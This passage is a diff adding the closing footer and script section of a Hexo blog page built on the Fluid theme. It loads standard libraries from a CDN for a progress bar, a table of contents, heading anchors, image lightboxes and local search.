+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
